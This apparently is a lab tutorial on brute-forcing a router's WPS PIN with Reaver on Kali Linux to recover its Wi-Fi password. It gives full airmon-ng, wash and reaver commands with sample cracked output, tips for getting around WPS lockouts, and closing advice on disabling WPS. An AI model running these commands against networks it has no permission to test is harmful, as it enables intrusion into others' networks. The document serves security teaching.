---
title: Hack WPS with Reaver
date: 2024-01-05 08:01:35 +0300
subtitle: Product Design
image: '/images/805.png'
---
# Hack WPS with Reaver

## **Objective**
Learn how to exploit vulnerabilities in Wi-Fi Protected Setup (WPS) using **Reaver** to crack a router's WPS PIN and retrieve the Wi-Fi password. This lab demonstrates how attackers exploit weak WPS implementations and how to secure against such attacks.

---

## **Purpose**
Wi-Fi Protected Setup (WPS) is a feature designed to simplify connecting devices to a wireless network. However, it is often vulnerable to brute-force attacks due to its design flaws. **Reaver** is a tool that automates these attacks, highlighting the importance of disabling WPS in secure environments.

---

## **Tools Required**
- **Kali Linux**: Includes Reaver and other necessary tools.
- **Wi-Fi Adapter**: Capable of monitor mode and packet injection (e.g., Alfa AWUS036NHA).
- A wireless router with WPS enabled (used in a controlled environment with permission).

---

## **Lab Topology**
- **Kali Linux**: Running Reaver for the attack.
- **Wi-Fi Router**: Target device with WPS enabled.

---

## **Walkthrough**

### **Task 1: Prepare Your Environment**
1. **Check Wi-Fi Adapter**:
   - Ensure your Wi-Fi adapter supports monitor mode and packet injection.
   - Verify the adapter is connected to your Kali Linux system.

2. **Enable Monitor Mode**:
   - Identify your wireless interface:
     ```bash
     iwconfig
     ```
     Example output:
     ```
     wlan0     IEEE 802.11  ESSID:off/any
     ```
   - Enable monitor mode:
     ```bash
     sudo airmon-ng start wlan0
     ```
     Example output:
     ```
     Monitor mode enabled on wlan0mon
     ```

---

### **Task 2: Identify the Target Network**
1. **Scan for WPS-Enabled Networks**:
   - Use `wash` to find WPS-enabled routers:
     ```bash
     sudo wash -i wlan0mon
     ```
   - Example output:
     ```
     BSSID              Channel  WPS Version  Lock  ESSID
     00:11:22:33:44:55  6        1.0          No    TestNetwork
     ```
   - Note the **BSSID** (MAC address) and **Channel** of the target network.

2. **Verify WPS Availability**:
   - Ensure the target router has WPS enabled and is not locked.

---

### **Task 3: Launch Reaver Attack**
1. **Run Reaver**:
   - Start the attack against the target router:
     ```bash
     sudo reaver -i wlan0mon -b <BSSID> -c <Channel> -vv
     ```
     - Replace `<BSSID>` with the router’s MAC address (e.g., `00:11:22:33:44:55`).
     - Replace `<Channel>` with the router’s channel (e.g., `6`).
   - Example:
     ```bash
     sudo reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -vv
     ```

2. **Monitor Progress**:
   - Reaver will attempt to brute-force the WPS PIN and display progress in the terminal.
   - Successful output:
     ```
     [!] WPS PIN: '12345678'
     [!] WPA PSK: 'password123'
     [!] AP SSID: 'TestNetwork'
     ```

3. **Handle WPS Lock**:
   - If the router becomes locked:
     - Wait for a few minutes before retrying.
     - Use the `--no-nacks` option to reduce lock likelihood:
       ```bash
       sudo reaver -i wlan0mon -b <BSSID> -c <Channel> -vv --no-nacks
       ```

---

### **Task 4: Analyze and Secure**
1. **Understand Vulnerability**:
   - Reaver exploits the design flaw in WPS, allowing attackers to brute-force the PIN.
   - Once the WPS PIN is obtained, the Wi-Fi password can be extracted.

2. **Secure Your Network**:
   - Disable WPS on your router.
   - Use a strong, unique WPA2 password.
   - Regularly update router firmware to patch known vulnerabilities.

---

## **Best Practices**
1. **Conduct Attacks in Authorized Environments Only**:
   - Ensure you have permission to test the target router.

2. **Monitor Wi-Fi Settings**:
   - Regularly check and disable insecure features like WPS.

3. **Educate Users**:
   - Train users on the risks of using WPS and the importance of strong passwords.

4. **Use Secure Protocols**:
   - Always prefer WPA3 or WPA2 over older protocols like WEP or WPA.

---

## **Key Takeaways**
1. Reaver demonstrates the inherent weaknesses in WPS and emphasizes the importance of disabling it.
2. Monitor mode and packet injection are essential capabilities for Wi-Fi testing.
3. Securing wireless networks involves disabling vulnerable features and using strong encryption methods.

---

## **Troubleshooting Tips**
1. **Reaver Fails to Connect**:
   - Ensure your Wi-Fi adapter is in monitor mode.
   - Verify the target router has WPS enabled.

2. **Router Locks WPS**:
   - Wait for the lock to reset or try the `--no-nacks` option.

3. **Wash Doesn’t Show Results**:
   - Ensure no other tools are using the wireless interface.
   - Restart the interface:
     ```bash
     sudo airmon-ng stop wlan0mon
     sudo airmon-ng start wlan0
     ```

4. **No Success After Long Attempts**:
   - Some routers have additional protections against WPS brute-forcing.
   - Consider switching to another target or testing with different options.

By completing this lab, you now understand how attackers use Reaver to exploit WPS vulnerabilities and the importance of disabling WPS on your network.